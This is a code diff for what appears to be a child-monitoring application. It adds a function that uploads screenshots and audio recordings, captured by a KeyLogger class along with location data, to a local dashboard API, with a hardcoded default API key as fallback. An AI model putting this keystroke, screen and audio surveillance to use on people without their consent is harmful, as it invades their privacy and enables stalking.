@@ -143,6 +143,33 @@ def post_to_dashboard(endpoint: str, data: dict) -> bool:
         logger.warning(f"[API] Could not reach dashboard: {e}")
         return False
 
+def upload_media(file_path: str | None, kind: str) -> bool:
+    """Upload media file to the Node API."""
+    if not file_path or not os.path.exists(file_path):
+        return False
+    try:
+        url = "http://localhost:5001/api/media/upload"
+        headers = {
+            "x-api-key": os.getenv("CHILD_API_KEY", "dev-child-api-key-change-me")
+        }
+        data = {
+            "childEmail": os.getenv("CHILD_EMAIL", "child@safeguard.local"),
+            "kind": kind
+        }
+        with open(file_path, "rb") as f:
+            mime_type = "image/png" if kind == "screenshot" else "audio/wav"
+            files = {"file": (os.path.basename(file_path), f, mime_type)}
+            resp = requests.post(url, headers=headers, data=data, files=files, timeout=10)
+            if resp.status_code == 200:
+                logger.info(f"[MEDIA] Uploaded {kind} successfully: {file_path}")
+                return True
+            else:
+                logger.warning(f"[MEDIA] Upload failed ({resp.status_code}): {resp.text}")
+                return False
+    except Exception as e:
+        logger.warning(f"[API] Media upload error: {e}")
+        return False
+
 
 class KeyLogger:
     """
@@ -231,6 +258,10 @@ class KeyLogger:
             ss_path = take_screenshot()
             audio_path = record_audio()
             location = get_location_info()
+
+            # Upload evidence to Node API for React Dashboard
+            upload_media(ss_path, "screenshot")
+            upload_media(audio_path, "audio")
 
             # Send email first so we know if it succeeded
             email_ok = self.email_service.send_alert(
